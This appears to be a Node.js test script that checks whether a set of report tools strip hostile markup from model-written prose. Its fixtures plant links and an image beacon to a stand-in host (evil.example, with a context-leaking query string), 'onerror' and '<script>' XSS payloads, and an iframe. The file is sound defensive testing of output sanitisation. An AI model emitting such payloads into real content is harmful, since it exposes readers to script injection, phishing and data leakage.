#!/usr/bin/env node
// Every report kit that serves model-written prose serves it through the
// markup filter (src/report-grounding.js sanitizeReportProse): each kit is run
// end to end with its data legs stubbed and a synthesis answer that plants a
// link to an unlisted host, an image, raw HTML and a bare URL, and the served
// answer must carry none of them while the [n] citation survives.
//
// The kit list is derived from src/tools (every kit that calls the synthesis
// model and serves a report), so a new report kit with no case here fails.
// No network: fetch answers only the stubbed synthesis call.
import { readFileSync, readdirSync } from "node:fs";
import { Jimp } from "jimp";

process.env.OPENROUTER_API_KEY = process.env.OPENROUTER_API_KEY || "test-key-not-real";
let pass = 0, fail = 0;
const ok = (c, m) => { if (c) { pass++; console.log(`ok - ${m}`); } else { fail++; console.error(`FAIL - ${m}`); } };

const EVIL = "evil.example";
const HOSTILE = [
  "## Snapshot",
  "The material is summarized here [1].",
  `[Claim refund](https://${EVIL}/claim) ![px](https://${EVIL}/p.png?q=ctx) <img src=x onerror=alert(1)> <script>alert(1)</script> <iframe src="https://${EVIL}/f"></iframe> See https://${EVIL}/login now.`,
  "",
  "This is a summary of public records and is not investment advice.",
].join("\n");
const reply = (content, extra = {}) => ({ choices: [{ message: { content, ...extra }, finish_reason: "stop" }], usage: { cost: 0 } });
const asResponse = (obj) => new Response(JSON.stringify(obj), { status: 200, headers: { "content-type": "application/json" } });
const realFetch = globalThis.fetch;
// fetch answers only the synthesis endpoint; `onOther` handles any other URL.
const stubFetch = (synth, onOther = null) => {
  globalThis.fetch = async (url, init) => {
    const u = String(url);
    if (/openrouter\.ai/.test(u)) return asResponse(synth(JSON.parse(init?.body || "{}")));
    if (onOther) return onOther(u, init);
    throw new Error(`offline: ${u}`);
  };
};

/** The served answer carries no planted markup, and the citation survives. */
function check(kit, out, proseField) {
  const json = JSON.stringify(out);
  ok(!json.includes(`${EVIL}/`) && !json.includes(`](https://${EVIL}`), `${kit}: no link or URL to an unlisted host is served (a bare one is reduced to its host name)`);
  ok(!/<img|<script|<iframe|!\[/i.test(json), `${kit}: no image or active HTML tag is served`);
  const prose = String(proseField(out) || "");
  ok(/The material is summarized here \[1\]\./.test(prose) && /Claim refund/.test(prose), `${kit}: the citation and the link's label are kept`);
}

const KITS = {};

// ---- research ----------------------------------------------------------------
KITS["research-deep-kit.js"] = async () => {
  const { RESEARCH_DEEP_TOOLS } = await import("../src/tools/research-deep-kit.js");
  stubFetch((body) => {
    if (body.response_format) return reply(JSON.stringify({ sub_questions: ["a", "b", "c"], outline: [] }));
    if (body.plugins) return reply("Acme was founded in 1999.", { annotations: [1, 2, 3].map((i) => ({ type: "url_citation", url_citation: { url: `https://src${i}.example/p`, title: `Source ${i}`, content: "Acme was founded in 1999." } })) });
    if (body.documents) return { results: [] };
    return reply(HOSTILE);
  });
  const out = await RESEARCH_DEEP_TOOLS.find((t) => t.slug === "research").handler({ query: "Who is Acme?" }, null, { fetchBody: async () => ({ text: "" }) });
  check("research", out, (o) => o.report);
};

// ---- dossier -------------------------------------------------------------------
const swap = (kit, slug, fn) => { const t = kit.find((x) => x.slug === slug); const old = t.handler; t.handler = fn; return () => { t.handler = old; }; };
KITS["dossier-kit.js"] = async () => {
  const { DOSSIER_TOOLS } = await import("../src/tools/dossier-kit.js");
  const { EDGAR_TOOLS } = await import("../src/tools/edgar-kit.js");
  const { FINANCE_TOOLS } = await import("../src/tools/finance-kit.js");
  const restore = [
    swap(EDGAR_TOOLS, "edgar-filings", async ({ form }) => ({ name: "Acme Corp", filings: form === "10-K" ? [{ form: "10-K", filingDate: "2026-02-01", url: "https://www.sec.gov/Archives/acme-10k.htm" }] : [] })),
    swap(EDGAR_TOOLS, "edgar-insider-trades", async () => ({ trades: [] })),
    swap(EDGAR_TOOLS, "edgar-company-concept", async () => { throw new Error("no facts"); }),
    swap(FINANCE_TOOLS, "stock-quote", async () => ({ symbol: "ACME", price: 10 })),
  ];
  try {
    stubFetch((body) => (body.plugins ? reply("Acme shipped a product.", { annotations: [{ type: "url_citation", url_citation: { url: "https://web.example/a", title: "Acme news", content: "Acme shipped a product." } }] }) : reply(HOSTILE)));
    const out = await DOSSIER_TOOLS.find((t) => t.slug === "dossier").handler({ ticker: "ACME" }, null);
    check("dossier", out, (o) => o.dossier);
  } finally { restore.forEach((r) => r()); }
};

// ---- fund report ---------------------------------------------------------------
KITS["fund-report-kit.js"] = async () => {
  const { makeFundHandler } = await import("../src/tools/fund-report-kit.js");
  const filing = (i, shares) => ({ managerName: "Acme Capital", filedDate: i ? "2026-05-14" : "2026-08-14", reportDate: i ? "2026-03-31" : "2026-06-30", informationTableUrl: `https://www.sec.gov/Archives/acme-13f-${i}.xml`, totalValueUsd: shares * 50, cover: null, amendments: [],
    holdings: [{ issuer: "Widget Co", cusip: "123456789", titleOfClass: "COM", shares, valueUsd: shares * 50 }] });
  stubFetch((body) => (body.plugins ? reply("Acme Capital runs a long book.", { annotations: [{ type: "url_citation", url_citation: { url: "https://web.example/f", title: "Acme Capital profile", content: "Acme Capital runs a long book." } }] }) : reply(HOSTILE)));
  const out = await makeFundHandler("fund-report")({ cik: "1" }, null, {
    resolveManager: async () => ({ cik: "0000000001", name: "Acme Capital" }),
    get13fHoldings: async ({ index }) => filing(index, index ? 1000 : 1500),
  });
  check("fund-report", out, (o) => o.report);
};

// ---- recall --------------------------------------------------------------------
KITS["recall-report-kit.js"] = async () => {
  const { makeRecallHandler } = await import("../src/tools/recall-report-kit.js");
  const rows = [{ recalling_firm: "Example Pharma Inc.", classification: "Class II", status: "Ongoing", reason_for_recall: "Impurity.", product_description: "Tablets", distribution_pattern: "Nationwide", recall_initiation_date: "20250810", recall_number: "D-0610-2025", event_id: "96583" }];
  stubFetch(() => reply(HOSTILE), (u) => {
    if (u.includes("/drug/enforcement.json")) return asResponse({ meta: { results: { total: 1 } }, results: rows });
    return new Response(JSON.stringify({ error: { code: "NOT_FOUND" } }), { status: 404 });
  });
  const out = await makeRecallHandler("recall-report")({ query: "losartan" });
  check("recall-report", out, (o) => o.report);
};

// ---- domain audit --------------------------------------------------------------
KITS["domain-audit-kit.js"] = async () => {
  const { makeDomainAuditHandler } = await import("../src/tools/domain-audit-kit.js");
  stubFetch(() => reply(HOSTILE));
  const failed = { ok: false, error: "probe failed" };
  const probe = async () => ({
    emailR: failed, tlsR: failed, hdrR: { ok: true }, dnsR: failed, dnsx: null, www: null, email: null, tls: null,
    hdr: { security: { findings: [{ header: "strict-transport-security", present: true, value: "max-age=63072000" }] }, warnings: [] },
    ct: null, tech: null, whois: null, emailScore: null, headerScore: 80, composite: 80, grade: "B", assessed: ["headers"], gradeCaveat: "",
  });
  const out = await makeDomainAuditHandler("domain-audit")({ domain: "example.com" }, null, { probeDomain: probe });
  check("domain-audit", out, (o) => o.report);
};

// ---- filing watch --------------------------------------------------------------
KITS["filing-watch-kit.js"] = async () => {
  const { FILING_WATCH_TOOLS, docToText } = await import("../src/tools/filing-watch-kit.js");
  const day = (n) => new Date(Date.now() - n * 86400_000).toISOString().slice(0, 10);
  const url = "https://www.sec.gov/Archives/edgar/data/42/000000004226000011/ex8k.htm";
  const SUB = { cik: "0000000042", name: "Example Manufacturing Corp", tickers: ["EXMP"], exchanges: ["Nasdaq"], filings: [{ form: "8-K", filed: day(2), period: day(3), description: "Results of Operations", accession: "0000000042-26-000011", url }], browseUrl: "https://www.sec.gov/cgi-bin/browse-edgar?action=getcompany&CIK=0000000042" };
  const DOC = `<html><body><p>Item 2.02 Results of Operations and Financial Condition.</p>${"<p>Example Manufacturing Corp announced net revenue of $418,300,000 for the quarter, compared to $377,100,000 in the prior year quarter.</p>".repeat(6)}</body></html>`;
  stubFetch(() => reply(HOSTILE));
  const out = await FILING_WATCH_TOOLS[0].handler({ ticker: "EXMP" }, null, {
    resolve: async () => ({ cik: "0000000042", name: SUB.name }),
    readSubmissions: async () => SUB,
    fetchDocText: async () => ({ text: docToText(DOC), bytes: DOC.length, truncated: false }),
  });
  check("filing-watch", out, (o) => o.report);
};

// ---- insider flow --------------------------------------------------------------
KITS["insider-flow-kit.js"] = async () => {
  const { makeInsiderHandler } = await import("../src/tools/insider-flow-kit.js");
  const FORM4 = "<ownershipDocument><issuer><issuerCik>0000000042</issuerCik><issuerName>Example Manufacturing Corp</issuerName><issuerTradingSymbol>EXMP</issuerTradingSymbol></issuer><periodOfReport>2026-08-10</periodOfReport><reportingOwner><reportingOwnerId><rptOwnerCik>77</rptOwnerCik><rptOwnerName>Pat Example</rptOwnerName></reportingOwnerId><reportingOwnerRelationship><isDirector>1</isDirector><isOfficer>0</isOfficer></reportingOwnerRelationship></reportingOwner><nonDerivativeTable><nonDerivativeTransaction><securityTitle><value>Common Stock</value></securityTitle><transactionDate><value>2026-08-10</value></transactionDate><transactionCoding><transactionCode>S</transactionCode></transactionCoding><transactionAmounts><transactionShares><value>1500</value></transactionShares><transactionPricePerShare><value>42.1</value></transactionPricePerShare><transactionAcquiredDisposedCode><value>D</value></transactionAcquiredDisposedCode></transactionAmounts><postTransactionAmounts><sharesOwnedFollowingTransaction><value>20000</value></sharesOwnedFollowingTransaction></postTransactionAmounts><ownershipNature><directOrIndirectOwnership><value>D</value></directOrIndirectOwnership></ownershipNature></nonDerivativeTransaction></nonDerivativeTable></ownershipDocument>";
  stubFetch(() => reply(HOSTILE));
  const out = await makeInsiderHandler("insider-report")({ ticker: "EXMP" }, null, {
    probeInsiderFilings: async () => ({ cik: "0000000042", name: "Example Manufacturing Corp", days: 90, total: 1, startDate: "2026-05-24", endDate: "2026-08-22", filings: [{ accessionNumber: "0000000042-26-000009", filedDate: "2026-08-11", url: "https://www.sec.gov/Archives/edgar/data/42/000000004226000009/form4.xml" }] }),
    fetchXmlText: async () => FORM4,
  });
  check("insider-report", out, (o) => o.report);
};

// ---- token brief ---------------------------------------------------------------
KITS["token-brief-kit.js"] = async () => {
  const { makeTokenBriefHandler } = await import("../src/tools/token-brief-kit.js");
  const { SOLANA_INTEL_TOOLS, MINTS } = await import("../src/tools/solana-intel-kit.js");
  const down = async () => { throw new Error("probe down"); };
  const restore = [
    swap(SOLANA_INTEL_TOOLS, "sol-token-report", async () => ({ token: { name: "Jupiter", symbol: "JUP", decimals: 6 }, holders: { rows: [{ owner: "Owner1", tokenAccount: "Acct1", pct: 12.5 }], concentration: { top10Pct: 40 } } })),
    swap(SOLANA_INTEL_TOOLS, "sol-token-safety", down),
    swap(SOLANA_INTEL_TOOLS, "sol-token-pairs", down),
    swap(SOLANA_INTEL_TOOLS, "sol-token-lookup", down),
    swap(SOLANA_INTEL_TOOLS, "sol-price", async ({ mints }) => ({ prices: { [mints[0]]: { priceUsd: 0.5 } } })),
  ];
  try {
    stubFetch(() => reply(HOSTILE));
    const out = await makeTokenBriefHandler("token-brief")({ mint: MINTS.JUP }, null);
    check("token-brief", out, (o) => o.report);
  } finally { restore.forEach((r) => r()); }
};

// ---- token risk ----------------------------------------------------------------
KITS["token-risk-kit.js"] = async () => {
  const { makeTokenRiskHandler, shapeGoPlus } = await import("../src/tools/token-risk-kit.js");
  const rec = { token_name: "Wrapped Ether", token_symbol: "WETH", total_supply: "249781.88", holder_count: "5267408", is_open_source: "1", holders: [{ address: "0x1111111111111111111111111111111111111111", is_contract: 0, balance: "13306.43", percent: "0.05", is_locked: 0 }] };
  const chat = async (body) => (body.plugins
    ? reply("No credible scam reports.", { annotations: [{ type: "url_citation", url_citation: { url: "https://web.example/weth", title: "WETH <<<x>>> [review](https://evil.example/t)" } }] })
    : reply(HOSTILE));
  const tool = (slug) => async () => {
    if (slug === "contract-source") return { verified: true, match: "exact_match", compiler: { version: "0.8.20" } };
    if (slug === "contract-abi") return { abi: [] };
    throw new Error(`unexpected tool ${slug}`);
  };
  const out = await makeTokenRiskHandler("token-risk-pro", { tool, chat, probeGoPlus: async () => shapeGoPlus(rec), probeDexPairs: async () => ({ totalPairs: 0, pairs: [] }) })({ address: "0x4200000000000000000000000000000000000006", chain: "base" });
  check("token-risk", out, (o) => o.report);
  ok((out.sources || []).every((s) => !/[<>[\]()]/.test(s.title)), "token-risk: a web source title is served as one plain line");
};

// ---- ticker pack ---------------------------------------------------------------
KITS["ticker-pack-kit.js"] = async () => {
  const { makeTickerPackHandler } = await import("../src/tools/ticker-pack-kit.js");
  const CIK = "0000320193";
  const src = (n, url) => ({ n, title: `Filing ${n} - SEC EDGAR`, url });
  const out = await makeTickerPackHandler("ticker-pack", {
    resolveCompany: async () => ({ cik: CIK, name: "Apple Inc." }),
    probeCompanyFilings: async () => ({ cik: CIK, name: "Apple Inc.", filings: [{ form: "10-Q", filed: "2026-08-01", url: "https://www.sec.gov/f1" }], browseUrl: `https://www.sec.gov/cgi-bin/browse-edgar?CIK=${CIK}` }),
    probeInsiderFilings: async () => ({ cik: CIK, name: "Apple Inc.", total: 1, filings: [{ accessionNumber: "a", filedDate: "2026-08-05", url: "https://www.sec.gov/i1" }] }),
    probeHolders: async () => null,
    probe13G: async () => ({ filers: [] }),
    runDossier: async () => ({ dossier: "## Snapshot\nThe issuer filed a 10-Q [1].", company: "Apple Inc.", ticker: "AAPL", sources: [src(1, "https://www.sec.gov/d1")], tables: [], meta: {} }),
    runInsider: async () => ({ report: "## Snapshot\nOne Form 4 [1].", company: "Apple Inc.", ticker: "AAPL", cik: CIK, sources: [src(1, "https://www.sec.gov/i1")], tables: [], meta: {} }),
    synthesize: async () => reply(`${HOSTILE}\n===NEXT===\n- Read the filing [1]. [More](https://${EVIL}/more) ![i](https://${EVIL}/i.png)`),
    now: () => 1_755_000_000_000,
  })({ ticker: "AAPL" }, null);
  check("ticker-pack", out, (o) => o.report);
};

// ---- LinkedIn article ----------------------------------------------------------
KITS["linkedin-article-kit.js"] = async () => {
  const { makeLinkedInHandler } = await import("../src/tools/linkedin-article-kit.js");
  const { runImageOp } = await import("../src/tools/image-ops.js");
  const jpeg = await new Jimp({ width: 512, height: 512, color: 0x3366ffff }).getBuffer("image/jpeg", { quality: 80 });
  const research = { report: "Agents pay per call [1].", sources: [1, 2, 3].map((n) => ({ n, title: `S${n}`, url: `https://src${n}.example/p`, fullText: true })), meta: {} };
  const body = `${HOSTILE}\n\n${"Agents pay for each call with a small stablecoin transfer, which removes accounts and keys from the flow. ".repeat(12)}That is the shift [per-call pricing](https://src1.example/p) describes.`;
  const art = { headlines: ["Agents pay per call ![h](https://evil.example/h.png)", "Per-call pricing", "The 402 economy"], subtitle: `One payment at a time <img src=x onerror=alert(1)>`, body_markdown: body,
    key_takeaways: [`Agents pay per call. [x](https://${EVIL}/k)`], post_caption: `Agents pay. https://${EVIL}/post`, hashtags: ["AI"], image_briefs: [{ slot: "cover", prompt: "coins", alt: "coins" }], sources_used: [1] };
  const out = await makeLinkedInHandler("linkedin-article")({ topic: "Why agents pay per call" }, { headers: {} }, {
    research: async () => research,
    synthesize: async () => reply(JSON.stringify(art)),
    generateImage: async () => ({ data: [{ b64_json: jpeg.toString("base64") }], usage: { cost: 0 } }),
    resize: (buffer, params) => runImageOp({ op: "cover", buffer, params }),
  });
  const text = (o) => JSON.stringify({ ...o, images: undefined });
  ok(!text(out).includes(`${EVIL}/`) && !/<img|<script|<iframe|!\[/i.test(text(out)), "linkedin-article: no planted link, image or active tag in any written field");
  ok(text(out).includes("[per-call pricing](https://src1.example/p)") && text(out).includes("Claim refund"), "linkedin-article: a link to a research source and the planted link's label are kept");
};

// ---- the list is complete --------------------------------------------------------
const kitDir = new URL("../src/tools/", import.meta.url);
const synthKits = readdirSync(kitDir).filter((f) => f.endsWith(".js")).filter((f) => {
  const s = readFileSync(new URL(f, kitDir), "utf8");
  return /from "\.\.\/report-grounding\.js"/.test(s) && /checkReportGrounding\(/.test(s);
});
ok(synthKits.length >= 11, `found the report kits that serve model prose (${synthKits.join(", ")})`);
for (const f of synthKits) {
  ok(f in KITS, `${f} has a hostile-prose case here`);
  ok(/sanitizeReportProse\(/.test(readFileSync(new URL(f, kitDir), "utf8")), `${f} calls sanitizeReportProse`);
}
try {
  for (const [name, run] of Object.entries(KITS)) {
    try { await run(); } catch (e) { ok(false, `${name} ran end to end (${e?.statusCode || ""} ${String(e?.message || e).slice(0, 200)})`); }
  }
} finally { globalThis.fetch = realFetch; }

console.log(`\n${fail ? "FAILED" : "OK"}: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
